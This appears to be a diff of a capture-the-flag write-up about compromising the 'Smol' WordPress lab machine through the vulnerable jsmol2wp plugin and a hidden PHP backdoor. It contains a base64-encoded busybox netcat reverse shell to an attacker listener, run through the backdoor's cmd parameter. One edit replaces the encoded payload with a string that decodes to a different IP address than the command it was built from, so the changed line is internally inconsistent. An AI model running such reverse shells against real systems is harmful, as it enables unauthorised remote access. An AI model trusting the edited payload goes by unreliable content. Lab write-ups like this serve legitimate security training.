@@ -164,7 +164,7 @@ echo "busybox nc 10.6.48.108 4445 -e sh" | base64
 
 The encoded payload was then executed via the cmd parameter in the URL:
 
-http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC42LjQ4LjEwOCA0NDQ1IC1lIHNo | base64 -d | bash
+http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC42LjQ0LjEwOCA0NDQ1IC1lIHNo | base64 -d | bash
 
 Setting up the Netcat Listener
 
@@ -331,7 +331,7 @@ The Smol.thm machine was successfully exploited by chaining multiple vulnerabili
 
     Initial reconnaissance with Nmap and Gobuster to identify WordPress.
 
-    WPScan was a lifesaver here, helping to pinpoint the vulnerable jsmol2wp plugin.
+    WPScan was instrumental in identifying potential vulnerabilities, helping to pinpoint the vulnerable jsmol2wp plugin.
 
     Exploiting an SSRF vulnerability in that plugin to gain database credentials and uncover a hidden PHP backdoor.
 
